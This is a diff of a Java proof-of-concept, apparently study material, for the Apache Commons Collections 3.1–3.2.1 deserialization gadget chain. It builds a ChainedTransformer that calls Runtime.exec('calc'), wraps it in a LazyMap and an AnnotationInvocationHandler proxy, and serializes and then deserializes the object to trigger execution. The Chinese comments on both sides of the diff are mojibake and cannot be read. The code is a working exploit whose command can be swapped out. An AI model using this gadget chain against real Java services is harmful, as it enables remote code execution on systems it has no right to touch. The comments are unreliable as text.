@@ -19,68 +19,68 @@ import java.util.Map;
 public class CommonsCollections1  {
 
     /**
-     * 3.1-3.2.1 jdk°æ±¾Ğ¡ÓÚu71
+     * 3.1-3.2.1 jdkç‰ˆæœ¬å°äºu71
      *
      * ->AnnotationInvocationHandler.readObject()
-     *       ->mapProxy.entrySet().iterator()  //¶¯Ì¬´úÀíÀà
+     *       ->mapProxy.entrySet().iterator()  //åŠ¨æ€ä»£ç†ç±»
      *           ->AnnotationInvocationHandler.invoke()
      *             ->LazyMap.get()
      *                 ->ChainedTransformer.transform()
      *                 ->ConstantTransformer.transform()
      *                     ->InvokerTransformer.transform()
-     *                     ->¡­¡­¡­¡­
+     *                     ->â€¦â€¦â€¦â€¦
      *
-     * Q£ºÎªÊ²Ã´ÕâÀïĞèÒªĞòÁĞ»¯
-     * A£ºÒòÎªĞèÒªµ÷ÓÃreadObjectº¯Êı£¬Õâ¸öº¯ÊıÊÇAnnotionÖØĞ´µÄº¯Êı£¬·ÇjavaÔ­Éú
-     * Q£ºÎªÊ²Ã´ĞèÒªµ÷ÓÃreadObjectº¯Êı
-     * A£ºÒòÎª¸Ãº¯ÊıÖĞµ÷ÓÃÁËget·½·¨±éÀúÁË×ÔÉíÀàĞÍÎªMapµÄmemberValuesÊôĞÔ£¬²¢¶ÔEntry¶ÔÏóÖ´ĞĞsetVaule²Ù×÷
-     * Q£ºÎªÊ²Ã´Ò»¶¨ĞèÒªµ÷ÓÃget·½·¨£¿
-     * A£ºÒòÎªĞèÒªlazyMapµÄget·½·¨»áµ÷ÓÃtransform·½·¨¡£
-     * Q£ºÎªÊ²Ã´Ò»¶¨Òªµ÷ÓÃtransform·½·¨£¿
-     * A£ºÒòÎªtransform·½·¨ÖĞÍ¨¹ı·´Éä£¬µ÷ÓÃÖ¸¶¨·½·¨£¬¿ÉÒÔ´«ÈëÌØ¶¨µÄ¶ÔÏó£¬À´Ö´ĞĞÏµÍ³ÃüÁî
+     * Qï¼šä¸ºä»€ä¹ˆè¿™é‡Œéœ€è¦åºåˆ—åŒ–
+     * Aï¼šå› ä¸ºéœ€è¦è°ƒç”¨readObjectå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯Annotioné‡å†™çš„å‡½æ•°ï¼ŒéjavaåŸç”Ÿ
+     * Qï¼šä¸ºä»€ä¹ˆéœ€è¦è°ƒç”¨readObjectå‡½æ•°
+     * Aï¼šå› ä¸ºè¯¥å‡½æ•°ä¸­è°ƒç”¨äº†getæ–¹æ³•éå†äº†è‡ªèº«ç±»å‹ä¸ºMapçš„memberValueså±æ€§ï¼Œå¹¶å¯¹Entryå¯¹è±¡æ‰§è¡ŒsetVauleæ“ä½œ
+     * Qï¼šä¸ºä»€ä¹ˆä¸€å®šéœ€è¦è°ƒç”¨getæ–¹æ³•ï¼Ÿ
+     * Aï¼šå› ä¸ºéœ€è¦lazyMapçš„getæ–¹æ³•ä¼šè°ƒç”¨transformæ–¹æ³•ã€‚
+     * Qï¼šä¸ºä»€ä¹ˆä¸€å®šè¦è°ƒç”¨transformæ–¹æ³•ï¼Ÿ
+     * Aï¼šå› ä¸ºtransformæ–¹æ³•ä¸­é€šè¿‡åå°„ï¼Œè°ƒç”¨æŒ‡å®šæ–¹æ³•ï¼Œå¯ä»¥ä¼ å…¥ç‰¹å®šçš„å¯¹è±¡ï¼Œæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤
      *
      * @param args
      */
     public static void main(String[] args) {
-        //TransformerÊı×é
+        //Transformeræ•°ç»„
         Transformer[] transformers = new Transformer[] {
                 new ConstantTransformer(Runtime.class),
-                //Ë¼¿¼£ºÎªÊ²Ã´µÚ¶ş¸ö²ÎÊıÓĞµÄÊÇÁ½¸öÖµ£¬ÓĞµÄÊÇÒ»¸öÖµ£»ºÜ¼òµ¥£¬ÒòÎª¸Ã·½·¨µÄ¶¨Òå¾ÍĞèÒªÕâÁ½¸ö²ÎÊıÀàĞÍ£¬µÚÈı¸ö²ÎÊı¾ÍÊÇ¸øÇ°ÃæµÄ·½·¨Ö¸¶¨²ÎÊı
+                //æ€è€ƒï¼šä¸ºä»€ä¹ˆç¬¬äºŒä¸ªå‚æ•°æœ‰çš„æ˜¯ä¸¤ä¸ªå€¼ï¼Œæœ‰çš„æ˜¯ä¸€ä¸ªå€¼ï¼›å¾ˆç®€å•ï¼Œå› ä¸ºè¯¥æ–¹æ³•çš„å®šä¹‰å°±éœ€è¦è¿™ä¸¤ä¸ªå‚æ•°ç±»å‹ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯ç»™å‰é¢çš„æ–¹æ³•æŒ‡å®šå‚æ•°
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
-                //invoke·½·¨µÄµÚÒ»¸ö²ÎÊıÊÇnull£¬±íÊ¾µ÷ÓÃ¾²Ì¬·½·¨£»µÚ¶ş¸ö²ÎÊıÊÇÒ»¸ö¿ÕµÄObjectÊı×é£¬±íÊ¾µ÷ÓÃµÄ·½·¨Ã»ÓĞ²ÎÊı¡£Õâ¸öµ÷ÓÃµÄ½á¹ûÊÇ·µ»Ønull£¬ÒòÎªÎÒÃÇÃ»ÓĞÖ¸¶¨Òªµ÷ÓÃµÄ
+                //invokeæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯nullï¼Œè¡¨ç¤ºè°ƒç”¨é™æ€æ–¹æ³•ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªç©ºçš„Objectæ•°ç»„ï¼Œè¡¨ç¤ºè°ƒç”¨çš„æ–¹æ³•æ²¡æœ‰å‚æ•°ã€‚è¿™ä¸ªè°ƒç”¨çš„ç»“æœæ˜¯è¿”å›nullï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰æŒ‡å®šè¦è°ƒç”¨çš„
                 new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                 new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
         };
 
-        //ChainedTransformerÊµÀı
+        //ChainedTransformerå®ä¾‹
         Transformer chainedTransformer = new ChainedTransformer(transformers);
-        //LazyMapÊµÀı
+        //LazyMapå®ä¾‹
         Map uselessMap = new HashMap();
         Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);
 
         try {
-            //AnnotationInvocationHandler×¢½âµÄ¶¯Ì¬´úÀí
-            //·´Éä»ñÈ¡AnnotationInvocationHandlerÊµÀı
+            //AnnotationInvocationHandleræ³¨è§£çš„åŠ¨æ€ä»£ç†
+            //åå°„è·å–AnnotationInvocationHandlerå®ä¾‹
             Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
             Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
             constructor.setAccessible(true);
-            //ÕâÀï´´½¨handleÊÇÎª¸ù¾İLazyMap´´½¨¶¯Ì¬´úÀí¶ÔÏó£¬ÒòÎªAnnotation×Ô¶¯ÊµÏÖÁËInvocationHandle½Ó¿Ú£¬ËùÒÔÕâÀï¿ÉÒÔÖ±½Ó×ª»»
+            //è¿™é‡Œåˆ›å»ºhandleæ˜¯ä¸ºæ ¹æ®LazyMapåˆ›å»ºåŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œå› ä¸ºAnnotationè‡ªåŠ¨å®ç°äº†InvocationHandleæ¥å£ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç›´æ¥è½¬æ¢
             InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
 
-            //¶¯Ì¬´úÀíÀà£¬ÉèÖÃÒ»¸öD´úÀí¶ÔÏó£¬ÎªÁË´¥·¢ AnnotationInvocationHandler#invoke
+            //åŠ¨æ€ä»£ç†ç±»ï¼Œè®¾ç½®ä¸€ä¸ªDä»£ç†å¯¹è±¡ï¼Œä¸ºäº†è§¦å‘ AnnotationInvocationHandler#invoke
             Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);
 
             InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
 
-            //ĞòÁĞ»¯
-            //ÕâÀïÊ¹ÓÃjdk281»á±¨´í£¬org.apache.commons.collections.functors.InvokerTransformerµÄĞòÁĞ»¯ĞòÁĞ»¯±»½ûÓÃ
+            //åºåˆ—åŒ–
+            //è¿™é‡Œä½¿ç”¨jdk281ä¼šæŠ¥é”™ï¼Œorg.apache.commons.collections.functors.InvokerTransformerçš„åºåˆ—åŒ–åºåˆ—åŒ–è¢«ç¦ç”¨
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos);
             oos.writeObject(handler1);
             oos.flush();
             oos.close();
 
-            //²âÊÔ·´ĞòÁĞ»¯
+            //æµ‹è¯•ååºåˆ—åŒ–
             ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
             ObjectInputStream ois = new ObjectInputStream(bais);
             ois.readObject();
